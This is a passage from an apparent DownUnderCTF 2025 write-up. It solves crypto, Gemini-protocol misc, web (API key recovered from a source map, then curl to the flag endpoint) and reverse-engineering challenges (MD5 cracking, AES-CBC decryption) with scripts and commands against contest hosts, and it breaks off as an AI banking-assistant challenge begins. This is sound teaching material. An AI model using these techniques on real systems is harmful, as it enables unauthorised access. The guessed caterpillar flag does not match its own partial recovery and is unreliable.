        return bytes(x ^ y for x, y in zip(a, b))

    print("[*] Starting recovery...")

    # Use the relationship:
    # output_1[i] XOR output_k[i] = flag[i] XOR flag[k*i]
    # If flag[i] known, can get flag[k*i], and vice versa.

    changed = True
    while changed:
        changed = False
        for k in range(2, 8):  # for outputs 2 to 7
            out1 = outputs[0]
            outk = outputs[k-1]
            length = min(len(out1), len(outk))
            for i in range(length):
                idx1 = i
                idx2 = k * i
                if idx2 >= max_index:
                    continue

                val1 = out1[i]
                valk = outk[i]
                xor_flag = val1 ^ valk  # = flag[i] XOR flag[k*i]

                f1 = recovered_flag[idx1]
                f2 = recovered_flag[idx2]

                if f1 is not None and f2 is None:
                    recovered_flag[idx2] = f1 ^ xor_flag
                    changed = True
                elif f2 is not None and f1 is None:
                    recovered_flag[idx1] = f2 ^ xor_flag
                    changed = True
                # else if both known or both unknown, no update

    print("[*] Recovery done.\n")

    # Try to print the flag
    print("Recovered flag bytes (partial or full):")

    # Print as ASCII where possible, '.' if unknown
    flag_str = ""
    for b in recovered_flag[:]:  # print all bytes
        if b is None:
            flag_str += "."
        elif 32 <= b < 127:
            flag_str += chr(b)
        elif b == recovered_flag[-1]:
            flag_str += "}"
            break
        else:
            flag_str += "?"

    print(flag_str)

</div>

</div>

Running the recovery script gives us:

<div class="language-plaintext highlighter-rouge">

<div class="code-header">

<span label-text="Plaintext"></span>

</div>

<div class="highlight">

``` lineno
1
```

    DUCTF{the_h.n.ry_.i.tl..p_.mo.t._..te...l.a..w.._an...l.g..._..r_.....}

</div>

</div>

This is a partial recovery. Now we need to fill in the gaps using
context and educated guessing:

**Step 1:** Recognize the pattern - this appears to be related to “The
Very Hungry Caterpillar” story **Step 2:** Fill in obvious words:

- `the_h.n.ry` → `the_hungry`
- `.i.tl.` → `little`
- `_..te...l.a.` → `caterpillar`

**Step 3:** Continue pattern recognition with some calculations:

<div class="language-plaintext highlighter-rouge">

<div class="code-header">

<span label-text="Plaintext"></span>

</div>

<div class="highlight">

``` lineno
1
```

    DUCTF{the_hungry_little_p_smooth_caterpillar_w.._an_a.legor._for_life}

</div>

</div>

**Step 4:** Final guessing for remaining gaps:

- `w..` → `won`
- `a.legor.` → `allegory`

**Output:**

<div class="language-plaintext highlighter-rouge">

<div class="code-header">

<span label-text="Plaintext"></span>

</div>

<div class="highlight">

``` lineno
1
2
```

    Partial flag: DUCTF{the_h.n.ry_.i.tl..p_.mo.t._..te...l.a..w.._an...l.g..._..r_.....}
    Final flag:   DUCTF{the_hungry_little_p_smooth_caterpillar_won_an_allegory_for_life}

</div>

</div>

**Flag:**
`DUCTF{the_hungry_little_p_smooth_caterpillar_won_an_allegory_for_life}`

<a href="/assets/img/posts/DUCTF/english.gif"
class="popup img-link shimmer"><img
src="/assets/img/posts/DUCTF/english.gif" loading="lazy"
alt="english" /></a>

### <span class="me-2">Challenge 12: Horoscopes</span><a href="#challenge-12-horoscopes"
class="anchor text-muted"><em></em></a>

**Solves:** 199  
**Category:** Beginner / Misc

#### <span class="me-2">Description</span><a href="#description-11" class="anchor text-muted"><em></em></a>

> **Hey Sis! Its getting pretty bad out here.. they keep telling us to
> connect on this new and improved protocol. The regular web is being
> systematically attacked and compromised**
>
> **Little Tommy has been born! He’s a Taurus just a month before
> matching his mum and dad! Hope to see you all for Christmas**
>
> **Love, XXXX**

**Connection:** `nc chal.2025.ductf.net 30015`

#### <span class="me-2">Solve</span><a href="#solve-9" class="anchor text-muted"><em></em></a>

We start by connecting to the given netcat service to see what we’re
dealing with:

<div class="language-bash highlighter-rouge">

<div class="code-header">

<span label-text="Shell"></span>

</div>

<div class="highlight">

``` lineno
1
```

    nc chal.2025.ductf.net 30015

</div>

</div>

However, any input we send just returns `2`. This seems unusual, so
let’s examine the raw response using `xxd`:

<div class="language-bash highlighter-rouge">

<div class="code-header">

<span label-text="Shell"></span>

</div>

<div class="highlight">

``` lineno
1
2
```

    nc chal.2025.ductf.net 30015 | xxd
    00000000: 1503 0300 0202 32                        ......2

</div>

</div>

The response starts with `15 03 03`, which is the TLS handshake pattern!
This indicates we’re dealing with a TLS-encrypted connection, not plain
text.

Let’s try connecting with OpenSSL:

<div class="language-bash highlighter-rouge">

<div class="code-header">

<span label-text="Shell"></span>

</div>

<div class="highlight">

``` lineno
1
```

    openssl s_client -connect chal.2025.ductf.net:30015

</div>

</div>

This establishes a TLS connection but waits for our input. However,
basic HTTP requests don’t work. After some experimentation with
different flags:

<div class="language-bash highlighter-rouge">

<div class="code-header">

<span label-text="Shell"></span>

</div>

<div class="highlight">

``` lineno
1
```

    openssl s_client -connect chal.2025.ductf.net:30015 -crlf -ign_eof

</div>

</div>

Now when we send something, we get an error:

<div class="language-plaintext highlighter-rouge">

<div class="code-header">

<span label-text="Plaintext"></span>

</div>

<div class="highlight">

``` lineno
1
```

    59 Invalid URL

</div>

</div>

Let’s try using HTTPS protocol:

<div class="language-plaintext highlighter-rouge">

<div class="code-header">

<span label-text="Plaintext"></span>

</div>

<div class="highlight">

``` lineno
1
```

    https://chal.2025.ductf.net

</div>

</div>

Response:

<div class="language-plaintext highlighter-rouge">

<div class="code-header">

<span label-text="Plaintext"></span>

</div>

<div class="highlight">

``` lineno
1
```

    53 Unsupported URL scheme

</div>

</div>

This tells us the protocol is wrong. Looking back at the challenge
description, there’s a hint about a “new and improved protocol” and the
mention of problems with the “regular web”.

The key insight is that this is referencing the **Gemini protocol** - a
simple, privacy-focused internet protocol that’s an alternative to
HTTP/HTTPS.

Let’s try a Gemini request:

<div class="language-plaintext highlighter-rouge">

<div class="code-header">

<span label-text="Plaintext"></span>

</div>

<div class="highlight">

``` lineno
1
```

    gemini://chal.2025.ductf.net

</div>

</div>

**Response:**

<div class="language-plaintext highlighter-rouge">

<div class="code-header">

<span label-text="Plaintext"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
```

    # Welcome to the Wasteland Network
    The year is 2831. It's been XXXX years since The Collapse. The old web is dead - corrupted by the HTTPS viral cascade that turned our connected world into a weapon against us.

    But we survive. We adapt. We rebuild.

    This simple Gemini capsule is one node in the new network we're building - free from the complexity that doomed the old internet. No JavaScript. No cookies. No tracking. Just pure, clean information exchange.

    Some pages are struggling with corruption as we take further attacks.

    ## Navigation
    => /survival.gmi Survival Basics: First Steps in the New World
    => /salvaging.gmi Tech Salvaging: Safe Computing After the Fall
    => /community-hub.gmi Community Hub: Finding Other Survivors
    => /about-us.gmi About the Wasteland Network

    ## Daily Advisory
    ⚠ ALERT: Increased bot activity reported in old HTTP sectors 44-48. Avoid all mainstream browser use in these digital quadrants.
    ⚠ REMINDER: Always verify capsule certificates before sharing sensitive information. Trust no one who won't use Gemini protocol.
    ⚠ WARNING: Protocol has sustainnnnnned damages. Corruption detected within [------]. ProceeX with cauXXXn

    ## Message of the Day
    DUCTF{g3mini_pr0t0col_s4ved_us}

    "The old web was a mansion with a thousand unlocked doors. The new web is a bunker with one good lock." 
    - Ada, Network Founder

    Remember: Simple is safe. Complex is compromise.

    ## Update Log
    * 2831-04-04: Added new communications relay points in sectors 7 and 9
    * 2831-04-03: Updated survival maps for Western salvage zones
    * 2831-04-01: Repaired node connection to Australian wasteland network

</div>

</div>

**Flag:** `DUCTF{g3mini_pr0t0col_s4ved_us}`

### <span class="me-2">Challenge 13: Wiki</span><a href="#challenge-13-wiki" class="anchor text-muted"><em></em></a>

**Solves:** 168  
**Category:** Beginner / Misc

#### <span class="me-2">Description</span><a href="#description-12" class="anchor text-muted"><em></em></a>

> Use the Wiki to find the flag…
>
> **NOTE:** This challenge is a continuation of “Horoscopes”, we
> recommend you complete that challenge first!

#### <span class="me-2">Solve</span><a href="#solve-10" class="anchor text-muted"><em></em></a>

This challenge builds upon the Horoscopes challenge, so we know we need
to use the Gemini protocol to connect to `chal.2025.ductf.net:30015`.

From exploring the previous challenge, we discovered there’s a linker
page at `/linker.gmi` that contains links to all available pages on the
site. Looking at the linker page, we can see there are many pages
available - over 100 different links to various content.

Since we need to search through all these pages to find the flag, manual
exploration would be time-consuming. Instead, we can write a script to
automatically fetch all pages and search for the flag.

**Python Script:**

<div class="language-python highlighter-rouge">

<div class="code-header">

<span label-text="Python"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
```

    import socket
    import ssl
    import time
    import urllib.parse
    import os

    HOST = "chal.2025.ductf.net"
    PORT = 30015
    BASE_URL = "gemini://chal.2025.ductf.net"

    def send_gemini_request(path="gemini://chal.2025.ductf.net/"):
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        with socket.create_connection((HOST, PORT)) as sock:
            with context.wrap_socket(sock, server_hostname=HOST) as ssock:
                time.sleep(5)  # wait 5 seconds before sending request
                request = path + "\r\n"
                ssock.sendall(request.encode())
                time.sleep(1)  # wait 1 second for response
                
                response = b""
                while True:
                    try:
                        data = ssock.recv(4096)
                        if not data:
                            break
                        response += data
                    except socket.timeout:
                        break
                return response.decode(errors='ignore')

    def build_absolute_url(current_url, link):
        parsed = urllib.parse.urlparse(current_url)
        base_path = parsed.path
        if base_path.endswith('/'):
            base_dir = base_path
        else:
            base_dir = base_path.rsplit('/', 1)[0] + '/'
        
        link_stripped = link.lstrip('/')
        new_path = urllib.parse.urljoin(base_dir, link_stripped)
        return f"{parsed.scheme}://{parsed.netloc}{new_path}"

    def scrape_links_from_response(response):
        links = []
        for line in response.splitlines():
            if line.startswith("=>"):
                parts = line.split(maxsplit=2)
                if len(parts) >= 2:
                    links.append(parts[1])
        return links

    def save_content_to_file(url, content):
        parsed = urllib.parse.urlparse(url)
        filename = os.path.basename(parsed.path)
        if not filename:
            filename = "index.gmi"
        # Replace any problematic chars in filename
        filename = filename.replace('/', '_')
        
        with open(filename, "w", encoding="utf-8") as f:
            f.write(content)

    def main():
        start_path = BASE_URL + "/linker.gmi"
        print(f"Fetching links from {start_path} ...")
        response = send_gemini_request(start_path)
        links = scrape_links_from_response(response)
        
        if not links:
            print("No links found.")
            return
        
        absolute_links = [build_absolute_url(start_path, link) for link in links]
        print(f"Found {len(absolute_links)} links. Fetching each...")
        
        for url in absolute_links:
            print(f"Fetching {url} ...")
            content = send_gemini_request(url)
            save_content_to_file(url, content)
            print(f"Saved {url} content.")

    if __name__ == "__main__":
        main()

</div>

</div>

After running this script to download all the pages, we can search for
flags using grep:

<div class="language-bash highlighter-rouge">

<div class="code-header">

<span label-text="Shell"></span>

</div>

<div class="highlight">

``` lineno
1
```

    grep -ri "DUCTF{" .

</div>

</div>

**Output:**

<div class="language-plaintext highlighter-rouge">

<div class="code-header">

<span label-text="Plaintext"></span>

</div>

<div class="highlight">

``` lineno
1
2
```

    ./index.gmi:DUCTF{g3mini_pr0t0col_s4ved_us}
    ./rabid_bean_potato.gmi:DUCTF{rabbit_is_rabbit_bean_is_bean_potato_is_potato_banana_is_banana_carrot_is_carrot}

</div>

</div>

The first flag is from the Horoscopes challenge, and the second flag is
what we’re looking for in the Wiki challenge.

**Flag:**
`DUCTF{rabbit_is_rabbit_bean_is_bean_potato_is_potato_banana_is_banana_carrot_is_carrot}`

<a href="/assets/img/posts/DUCTF/wiki.gif"
class="popup img-link shimmer"><img
src="/assets/img/posts/DUCTF/wiki.gif" loading="lazy" alt="wiki" /></a>

### <span class="me-2">Challenge 14: Trusted</span><a href="#challenge-14-trusted" class="anchor text-muted"><em></em></a>

**Solves:** 105  
**Category:** Beginner / Misc

#### <span class="me-2">Description</span><a href="#description-13" class="anchor text-muted"><em></em></a>

> It looks like they never really finished their admin panel.. Or they
> let the intern do it. The connection info and credentials are all
> inside the server, but we can’t seem to get in.
>
> Maybe you can take a look at it and tell us whats behind the admin
> panel?
>
> **NOTE:** This challenge is a continuation of “Horoscopes”, we
> recommend you complete that challenge first!

#### <span class="me-2">Solve</span><a href="#solve-11" class="anchor text-muted"><em></em></a>

This challenge continues the Gemini protocol series. Since we already
have all the pages downloaded from the Wiki challenge, we can search
through them for admin-related information.

First, let’s search for “admin” references in our downloaded files:

<div class="language-bash highlighter-rouge">

<div class="code-header">

<span label-text="Shell"></span>

</div>

<div class="highlight">

``` lineno
1
```

    grep -ri "admin" .

</div>

</div>

**Output:**

<div class="language-plaintext highlighter-rouge">

<div class="code-header">

<span label-text="Plaintext"></span>

</div>

<div class="highlight">

``` lineno
1
2
```

    ./community-hub.gmi:## Admin Panel
    ./community-hub.gmi:To access the community admin panel connect to port: 756f

</div>

</div>

Let’s examine the community-hub.gmi file more closely:

<div class="language-bash highlighter-rouge">

<div class="code-header">

<span label-text="Shell"></span>

</div>

<div class="highlight">

``` lineno
1
```

    cat community-hub.gmi

</div>

</div>

Key information from the file:

<div class="language-plaintext highlighter-rouge">

<div class="code-header">

<span label-text="Plaintext"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
```

    ## Admin Panel
    To access the community admin panel connect to port: 756f
    Use the daily code phrase to prove you're not a bot.

</div>

</div>

The port `756f` is in hexadecimal, which converts to decimal port
`30063`.

Let’s try connecting to this port:

<div class="language-bash highlighter-rouge">

<div class="code-header">

<span label-text="Shell"></span>

</div>

<div class="highlight">

``` lineno
1
```

    nc chal.2025.ductf.net 30063

</div>

</div>

The connection closes quickly if we don’t send data immediately, so
let’s use a pipe to send a Gemini request:

<div class="language-bash highlighter-rouge">

<div class="code-header">

<span label-text="Shell"></span>

</div>

<div class="highlight">

``` lineno
1
```

    echo -e "gemini://chal.2025.ductf.net/" | nc chal.2025.ductf.net 30063

</div>

</div>

**Response:**

<div class="language-plaintext highlighter-rouge">

<div class="code-header">

<span label-text="Plaintext"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
4
5
```

    20 text/gemini
    # Admin Panel
    This page is under construction!
    If you are the admin, you should login
    => password_protected.gmi Login

</div>

</div>

Now let’s access the login page:

<div class="language-bash highlighter-rouge">

<div class="code-header">

<span label-text="Shell"></span>

</div>

<div class="highlight">

``` lineno
1
```

    echo -e "gemini://chal.2025.ductf.net/password_protected.gmi" | nc chal.2025.ductf.net 30063

</div>

</div>

**Response:**

<div class="language-plaintext highlighter-rouge">

<div class="code-header">

<span label-text="Plaintext"></span>

</div>

<div class="highlight">

``` lineno
1
```

    11 Moonlight reflects twice on still water

</div>

</div>

This appears to be a challenge-response authentication. We need to find
the response to this phrase in our downloaded files. Let’s search:

<div class="language-bash highlighter-rouge">

<div class="code-header">

<span label-text="Shell"></span>

</div>

<div class="highlight">

``` lineno
1
```

    grep -ri "Moonlight reflects twice on still water" .

</div>

</div>

Looking through the verification-codes.gmi file, we find:

<div class="language-plaintext highlighter-rouge">

<div class="code-header">

<span label-text="Plaintext"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
```

    ## Daily Code Phrase
    Today's authentication phrase: "Moonlight reflects twice on still water"
    Response: "But+ripples+show=truth%in motion"

</div>

</div>

Now we need to URL-encode this response and send it as a query
parameter:

<div class="language-bash highlighter-rouge">

<div class="code-header">

<span label-text="Shell"></span>

</div>

<div class="highlight">

``` lineno
1
```

    echo -e "gemini://chal.2025.ductf.net/password_protected.gmi?But%2Bripples%2Bshow%3Dtruth%25in%20motion" | nc chal.2025.ductf.net 30063

</div>

</div>

**Response:**

<div class="language-plaintext highlighter-rouge">

<div class="code-header">

<span label-text="Plaintext"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
4
```

    20 text/gemini
    # Welcome, Admin!
    You have successfully logged in.
    > DUCTF{Cr1pPl3_Th3_1nFr4sTrUCtu53}

</div>

</div>

**Flag:** `DUCTF{Cr1pPl3_Th3_1nFr4sTrUCtu53}`

<a href="/assets/img/posts/DUCTF/intern.gif"
class="popup img-link shimmer"><img
src="/assets/img/posts/DUCTF/intern.gif" loading="lazy"
alt="intern" /></a>

------------------------------------------------------------------------

## <span class="me-2">🌐 Web Challenges</span><a href="#-web-challenges" class="anchor text-muted"><em></em></a>

### <span class="me-2">Challenge 1: Mini-Me</span><a href="#challenge-1-mini-me" class="anchor text-muted"><em></em></a>

**Solves:** 855  
**Categories:** web

#### <span class="me-2">Description</span><a href="#description-14" class="anchor text-muted"><em></em></a>

> The app looks scrambled and full of brainrot! But there’s more than
> meets the eye. Dive into the code, connect the dots, and see if you
> can uncover what’s really going on behind the scenes, or right at the
> front!
>
> Challenge URL: `https://web-mini-me-ab6d19a7ea6e.2025.ductf.net/`

#### <span class="me-2">Reconnaissance</span><a href="#reconnaissance" class="anchor text-muted"><em></em></a>

<div class="language-bash highlighter-rouge">

<div class="code-header">

<span label-text="Shell"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
4
5
6
```

    # Initial directory structure analysis
    .
    ├── app.py
    └── templates
        ├── confidential.html
        └── index.html

</div>

</div>

Examining the Flask application (`app.py`), we find several key
endpoints:

- `/` - Main index page
- `/login` - Redirects to confidential page
- `/confidential.html` - Confidential page
- `/admin/flag` - Flag endpoint requiring API key authentication

#### <span class="me-2">Vulnerability Assessment</span><a href="#vulnerability-assessment"
class="anchor text-muted"><em></em></a>

The critical vulnerability lies in client-side exposure of sensitive
information. The application contains:

1.  **Source Map Exposure**: A comment in the minified JavaScript hints
    at a source map file
2.  **Obfuscated Client-Side Secret**: The source map reveals an
    obfuscated function containing the API key
3.  **Weak Obfuscation**: The obfuscation uses simple XOR operations
    that can be easily reversed

From the source map file (`test-main.min.js.map`), we discovered the
`qyrbkc()` function containing obfuscated character codes that decode to
the API secret key.

#### <span class="me-2">Exploitation</span><a href="#exploitation" class="anchor text-muted"><em></em></a>

**Step 1: Extract the obfuscated codes from the source map**

<div class="language-javascript highlighter-rouge">

<div class="code-header">

<span label-text="JavaScript"></span>

</div>

<div class="highlight">

``` lineno
1
2
```

    // From the qyrbkc() function in test-main.min.js.map
    const codes = [85, 87, 77, 67, 40, 82, 82, 70, 78, 39, 95, 89, 67, 73, 34, 68, 68, 92, 84, 57, 70, 87, 95, 77, 75];

</div>

</div>

**Step 2: Decode the XOR obfuscation**

<div class="language-python highlighter-rouge">

<div class="code-header">

<span label-text="Python"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
4
5
6
7
8
9
10
```

    codes = [85, 87, 77, 67, 40, 82, 82, 70, 78, 39, 95, 89, 67, 73, 34, 68, 68, 92, 84, 57, 70, 87, 95, 77, 75]

    decoded_chars = []
    for i, c in enumerate(codes):
        decoded_char = chr(c ^ (i + 1))
        decoded_chars.append(decoded_char)

    decoded_string = ''.join(decoded_chars)
    print(decoded_string)
    # Output: TUNG-TUNG-TUNG-TUNG-SAHUR

</div>

</div>

**Step 3: Use the decoded API key to retrieve the flag**

<div class="language-bash highlighter-rouge">

<div class="code-header">

<span label-text="Shell"></span>

</div>

<div class="highlight">

``` lineno
1
2
```

    curl -X POST https://web-mini-me-ab6d19a7ea6e.2025.ductf.net/admin/flag \
         -H "X-API-Key: TUNG-TUNG-TUNG-TUNG-SAHUR"

</div>

</div>

**Flag:** `DUCTF{Cl13nt-S1d3-H4ck1nG-1s-FuN}`

<a href="/assets/img/posts/DUCTF/brainrot.gif"
class="popup img-link shimmer"><img
src="/assets/img/posts/DUCTF/brainrot.gif" loading="lazy"
alt="brain rot" /></a>

------------------------------------------------------------------------

## <span class="me-2">🔍 Reverse Engineering</span><a href="#-reverse-engineering" class="anchor text-muted"><em></em></a>

### <span class="me-2">Challenge 1: Rocky</span><a href="#challenge-1-rocky" class="anchor text-muted"><em></em></a>

**Solves:** 522  
**Categories:** rev

#### <span class="me-2">Description</span><a href="#description-15" class="anchor text-muted"><em></em></a>

> An underdog boxer gets a once-in-a-lifetime shot at the world
> heavyweight title and proves his worth through sheer determination.

#### <span class="me-2">Reconnaissance</span><a href="#reconnaissance-1" class="anchor text-muted"><em></em></a>

<div class="language-bash highlighter-rouge">

<div class="code-header">

<span label-text="Shell"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
4
```

    # Test the binary
    ./rocky
    Enter input: randomstring
    Hash mismatch :(

</div>

</div>

The binary prompts for input and performs some kind of hash comparison.
Let’s analyze it with reverse engineering tools.

#### <span class="me-2">Vulnerability Assessment</span><a href="#vulnerability-assessment-1"
class="anchor text-muted"><em></em></a>

Using Ghidra to decompile the binary, we find the main function:

<div class="language-c highlighter-rouge">

<div class="code-header">

<span label-text="C"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
```

    undefined8 main(void)
    {
      int iVar1;
      size_t sVar2;
      undefined1 local_68 [32];
      undefined1 local_48 [16];
      char local_38 [32];
      undefined8 local_18;
      undefined8 local_10;
      
      local_18 = 0xd2f969f60c4d9270;
      local_10 = 0x1f35021256bdca3c;
      printf("Enter input: ");
      fgets(local_38,0x11,stdin);
      sVar2 = strcspn(local_38,"\n");
      local_38[sVar2] = '\0';
      md5String(local_38,local_48);
      iVar1 = memcmp(&local_18,local_48,0x10);
      if (iVar1 == 0) {
        puts("Hash matched!");
        reverse_string(local_38,local_68);
        decrypt_bytestring(local_38,local_68);
      }
      else {
        puts("Hash mismatch :(");
      }
      return 0;
    }

</div>

</div>

**Analysis:**

1.  The program stores two 64-bit values: `0xd2f969f60c4d9270` and
    `0x1f35021256bdca3c`
2.  It takes user input and calculates its MD5 hash
3.  It compares the input’s MD5 hash with the stored values
4.  If they match, it calls `reverse_string()` and
    `decrypt_bytestring()` functions

The vulnerability is that the expected MD5 hash is hardcoded in the
binary and can be extracted for cracking.

#### <span class="me-2">Exploitation</span><a href="#exploitation-1" class="anchor text-muted"><em></em></a>

**Step 1: Extract the MD5 hash from the hardcoded values**

<div class="language-python highlighter-rouge">

<div class="code-header">

<span label-text="Python"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
4
5
6
7
8
9
10
11
12
13
```

    import struct

    # Original 64-bit values (little-endian from Ghidra)
    first = 0xd2f969f60c4d9270
    second = 0x1f35021256bdca3c

    # Convert to bytes in little-endian format
    first_bytes = struct.pack('<Q', first)  # '<Q' means little-endian 64-bit
    second_bytes = struct.pack('<Q', second)

    # Combine and convert to hex
    md5_hash = (first_bytes + second_bytes).hex()
    print(md5_hash)  # Output: 70924d0cf669f9d23ccabd561202351f

</div>

</div>

**Step 2: Crack the MD5 hash**

Using an online MD5 cracking service like CrackStation:

<div class="language-plaintext highlighter-rouge">

<div class="code-header">

<span label-text="Plaintext"></span>

</div>

<div class="highlight">

``` lineno
1
```

    70924d0cf669f9d23ccabd561202351f => emergencycall911

</div>

</div>

**Step 3: Run the binary with the cracked input**

<div class="language-bash highlighter-rouge">

<div class="code-header">

<span label-text="Shell"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
4
```

    ./rocky
    Enter input: emergencycall911
    Hash matched!
    DUCTF{In_the_land_of_cubicles_lined_in_gray_Where_the_clock_ticks_loud_by_the_light_of_day}

</div>

</div>

**Flag:**
`DUCTF{In_the_land_of_cubicles_lined_in_gray_Where_the_clock_ticks_loud_by_the_light_of_day}`

<a href="/assets/img/posts/DUCTF/rev.gif"
class="popup img-link shimmer"><img
src="/assets/img/posts/DUCTF/rev.gif" loading="lazy" alt="rev" /></a>

### <span class="me-2">Challenge 2: Skippy</span><a href="#challenge-2-skippy" class="anchor text-muted"><em></em></a>

**Solves:** 313  
**Categories:** rev

#### <span class="me-2">Description</span><a href="#description-16" class="anchor text-muted"><em></em></a>

> Skippy seems to be in a bit of trouble skipping over some sandwiched
> functions. Help skippy get across with a hop, skip and a jump!

#### <span class="me-2">Reconnaissance</span><a href="#reconnaissance-2" class="anchor text-muted"><em></em></a>

<div class="language-bash highlighter-rouge">

<div class="code-header">

<span label-text="Shell"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
```

    # Check file type
    file skippy.exe
    skippy.exe: PE32+ executable (console) x86-64, for MS Windows, 19 sections

</div>

</div>

This is a Windows PE executable that we need to reverse engineer. Let’s
analyze it with a disassembler.

#### <span class="me-2">Vulnerability Assessment</span><a href="#vulnerability-assessment-2"
class="anchor text-muted"><em></em></a>

Using Ghidra to decompile the binary, we can see the program structure:

**Main Function:**

<div class="language-c highlighter-rouge">

<div class="code-header">

<span label-text="C"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
```

    int main(int *Argc, char ***Argv, char **_Env)
    {
      char local_48 [32];  // IV array
      char local_28 [32];  // Key array
      
      // Initialize key array with negative values
      local_28[0] = -0x1a;  // Will become 0x73 after right shift
      local_28[1] = -0x2a;  // Will become 0x6b after right shift
      // ... (continues for 16 bytes)
      
      sandwich(local_28);   // Process key
      
      // Initialize IV array with negative values
      local_48[0] = -0x2a;  // Will become 0x6b after right shift
      local_48[1] = -0x3e;  // Will become 0x61 after right shift
      // ... (continues for 16 bytes)
      
      sandwich(local_48);   // Process IV
      decrypt_bytestring((longlong)local_28,(undefined8 *)local_48);
      return 0;
    }

</div>

</div>

**Key Analysis:**

1.  The program initializes two arrays with negative byte values
2.  These arrays are processed by the `sandwich()` function
3.  The `sandwich()` function calls `stone()`, then `decryptor()`, then
    `stone()` again
4.  The `decryptor()` function performs a right bit shift operation on
    each byte
5.  Finally, `decrypt_bytestring()` uses AES-CBC decryption

**Decryptor Function:**

<div class="language-c highlighter-rouge">

<div class="code-header">

<span label-text="C"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
4
5
6
```

    void decryptor(longlong param_1)
    {
      for (local_10 = 0; local_10 < 0x10; local_10 = local_10 + 1) {
        *(byte *)(local_10 + param_1) = *(byte *)(local_10 + param_1) >> 1;
      }
    }

</div>

</div>

This function right-shifts each byte by 1 bit, effectively dividing by
2.

#### <span class="me-2">Exploitation</span><a href="#exploitation-2" class="anchor text-muted"><em></em></a>

**Step 1: Calculate the key and IV after processing**

The negative values are stored as two’s complement, and after
right-shifting:

<div class="language-python highlighter-rouge">

<div class="code-header">

<span label-text="Python"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
4
5
6
7
8
9
10
11
```

    # Original negative values for key
    key_raw = [-0x1a, -0x2a, -0x2e, -0x20, -0x20, -0xe, -0x42, -0x18, 
               -0x30, -0x36, -0x42, -0x3c, -0x16, -0x1a, -0x30, -0x42]

    # Original negative values for IV  
    iv_raw = [-0x2a, -0x3e, -0x24, -0x32, -0x3e, -0x1c, -0x22, -0x22,
              -0x22, -0x22, -0x22, -0x22, -0x22, -0x22, -0x22, -0x22]

    # Convert to unsigned bytes and right shift by 1
    key = bytes([(256 + x) >> 1 for x in key_raw])
    iv = bytes([(256 + x) >> 1 for x in iv_raw])

</div>

</div>

**Step 2: Extract encrypted data from the binary**

The encrypted data is stored at `DAT_14000a000` in the binary (96
bytes).

**Step 3: Decrypt using AES-CBC**

<div class="language-python highlighter-rouge">

<div class="code-header">

<span label-text="Python"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
```

    from Crypto.Cipher import AES

    # Key and IV (after right-shifting)
    key = bytes([0x73, 0x6b, 0x69, 0x70, 0x70, 0x79, 0x5f, 0x74, 
                 0x68, 0x65, 0x5f, 0x62, 0x75, 0x73, 0x68, 0x5f])
    iv = bytes([0x6b, 0x61, 0x6e, 0x67, 0x61, 0x72, 0x6f, 0x6f, 
                0x6f, 0x6f, 0x6f, 0x6f, 0x6f, 0x6f, 0x6f, 0x6f])

    # Encrypted data (96 bytes from the binary)
    encrypted_data = bytes.fromhex(
        "ae27241b7ffd2c8b3265f22ad1b063f0"
        "915b6b95dcc0eec14de2c563f7715594"
        "007d2bc75e5d614e5e51190f4ad1fd21"
        "c5c4b1ab89a4a725c5b8ed3cb3763072"
        "7b2d2ab722dc9333264725c6b5ddb00d"
        "d3c3da6313f1e2f4df5180d5f3831843"
    )

    # Decrypt
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted = cipher.decrypt(encrypted_data)

    # Print the decrypted flag
    print(decrypted.decode('utf-8', errors='ignore'))

</div>

</div>

**Flag:**
`DUCTF{There_echoes_a_chorus_enending_and_wild_Laughter_and_gossip_unruly_and_piled}`

<a href="/assets/img/posts/DUCTF/skippy.gif"
class="popup img-link shimmer"><img
src="/assets/img/posts/DUCTF/skippy.gif" loading="lazy"
alt="skippy" /></a>

------------------------------------------------------------------------

## <span class="me-2">🤖 AI Challenges</span><a href="#-ai-challenges" class="anchor text-muted"><em></em></a>

### <span class="me-2">Challenge 1: ductfbank 1</span><a href="#challenge-1-ductfbank-1"
class="anchor text-muted"><em></em></a>

**Solves:** 657  
**Category:** AI

#### <span class="me-2">Description</span><a href="#description-17" class="anchor text-muted"><em></em></a>

> I’m from DownUnderCTF Bank. As part of your company’s business
> relationship with us, we are pleased to offer you a complimentary
> personal banking account with us. A link to our website is below. If
> you have any further queries, please don’t hesitate to contact me!

#### <span class="me-2">Files Structure</span><a href="#files-structure" class="anchor text-muted"><em></em></a>

<div class="language-plaintext highlighter-rouge">

<div class="code-header">

<span label-text="Plaintext"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
4
5
6
7
8
```

    .
    ├── agent_snip.ts
    ├── bank_service.ts
    └── routes
        ├── ai.ts
        ├── dashboard.ts
        ├── layouts.ts
        └── login.ts

</div>

</div>

#### <span class="me-2">Approach</span><a href="#approach" class="anchor text-muted"><em></em></a>

This challenge involves interacting with an AI banking assistant that
has access to various tools for managing bank accounts. The key insight
